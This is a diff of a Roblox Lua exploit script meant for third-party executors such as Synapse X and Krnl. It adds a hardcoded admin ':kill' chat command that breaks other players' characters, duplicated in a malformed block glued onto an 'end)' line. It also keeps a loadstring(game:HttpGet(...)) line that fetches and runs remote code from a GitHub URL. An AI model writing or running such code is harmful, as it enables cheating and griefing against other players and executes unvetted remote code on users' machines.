@@ -1,48 +1,104 @@
---[[
+local Admins = {"kevinform203"}
 
- _                           _                  _                 _           _       
-| |                         | |                ( )               | |         (_)      
-| | ___  __ _  ___ _ __   __| | __ _ _ __ _   _|/ ___    __ _  __| |_ __ ___  _ _ __  
-| |/ _ \/ _` |/ _ \ '_ \ / _` |/ _` | '__| | | | / __|  / _` |/ _` | '_ ` _ \| | '_ \ 
-| |  __/ (_| |  __/ | | | (_| | (_| | |  | |_| | \__ \ | (_| | (_| | | | | | | | | | |
-|_|\___|\__, |\___|_| |_|\__,_|\__,_|_|   \__, | |___/  \__,_|\__,_|_| |_| |_|_|_| |_|
-         __/ |                             __/ |                                      
-        |___/                             |___/                                       
-]]
-
---[[
-if identifyexecutor() == "Krnl Beta" then
-game.Players.LocalPlayer:Kick("AveVato Has Banned you From this Script Hub with over 5k scripts")
+function Kill(Players)
+    for i,Player in ipairs(Players) do
+        if Player.Character then
+            Player.Character:BreakJoints()
+        end
+    end
 end
 
-if identifyexecutor() == "Krnl" then
-game.Players.LocalPlayer:Kick("AveVato Has Banned you From this Script Hub with over 5k scripts")
+function IsAdmin(Player)
+    for i,AdminName in ipairs(Admins) do
+        if Player.Name:lower() == AdminName:lower() then return true end
+    end
+    return false
 end
 
-if identifyexecutor() == "Comet" then
-game.Players.LocalPlayer:Kick("AveVato Has Banned you From this Script Hub with over 5k scripts")
+function GetPlayers(Player,Msg)
+    local Targets = {}
+    local Players = Game.Players:GetPlayers()
+
+    if Msg:lower() == "me" then
+        Targets = { Player }
+    elseif Msg:lower() == "all" then
+        Targets = Players
+    elseif Msg:lower() == "others" then
+        for i,Plr in ipairs(Players) do
+            if Plr ~= Player then
+                table.insert(Targets,Plr)
+            end
+        end
+    else
+        for i,Plr in ipairs(Players) do
+            if Plr.Name:lower():sub(1,Msg:len()) == Msg then
+                table.insert(Targets,Plr)
+            end
+        end
+    end
+    return Targets
 end
 
-if identifyexecutor() == "Script-Ware" then
-game.Players.LocalPlayer:Kick("AveVato Has Banned you From this Script Hub with over 5k scripts")
+Game.Players.PlayerAdded:connect(function(Player)
+    if IsAdmin(Player) then
+        Player.Chatted:connect(function(Msg)
+            if Msg:lower():sub(1,6) == ":kill " then
+                Kill(GetPlayers(Player,Msg:sub(7)))
+            end
+        end)
+    end
+end)if identifyexecutor() == "Synapse X" then
+local Admins = {"kevinform203"}
+
+function Kill(Players)
+    for i,Player in ipairs(Players) do
+        if Player.Character then
+            Player.Character:BreakJoints()
+        end
+    end
 end
 
-if identifyexecutor() == "Oxygen U" then
-game.Players.LocalPlayer:Kick("AveVato Has Banned you From this Script Hub with over 5k scripts")
+function IsAdmin(Player)
+    for i,AdminName in ipairs(Admins) do
+        if Player.Name:lower() == AdminName:lower() then return true end
+    end
+    return false
 end
 
-if identifyexecutor() == "JJSploit" then
-game.Players.LocalPlayer:Kick("AveVato Has Banned you From this Script Hub with over 5k scripts")
+function GetPlayers(Player,Msg)
+    local Targets = {}
+    local Players = Game.Players:GetPlayers()
+
+    if Msg:lower() == "me" then
+        Targets = { Player }
+    elseif Msg:lower() == "all" then
+        Targets = Players
+    elseif Msg:lower() == "others" then
+        for i,Plr in ipairs(Players) do
+            if Plr ~= Player then
+                table.insert(Targets,Plr)
+            end
+        end
+    else
+        for i,Plr in ipairs(Players) do
+            if Plr.Name:lower():sub(1,Msg:len()) == Msg then
+                table.insert(Targets,Plr)
+            end
+        end
+    end
+    return Targets
 end
 
-if identifyexecutor() == "JJSploit WeAreDevs" then
-game.Players.LocalPlayer:Kick("AveVato Has Banned you From this Script Hub with over 5k scripts")
+Game.Players.PlayerAdded:connect(function(Player)
+    if IsAdmin(Player) then
+        Player.Chatted:connect(function(Msg)
+            if Msg:lower():sub(1,6) == ":kill " then
+                Kill(GetPlayers(Player,Msg:sub(7)))
+            end
+        end)
+    end
+end)
 end
-
-if identifyexecutor() == "Synapse X" then
-game.Players.LocalPlayer:Kick("AveVato Has Banned you From this Script Hub with over 5k scripts")
-end
-]]
 
 local Lib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/Sinnerx3Florencia/Sinnerx3Florencia/main/Notification'),true))()
 Lib.prompt('Galaxy Servers', 'Thank You For Using Galaxy Servers')
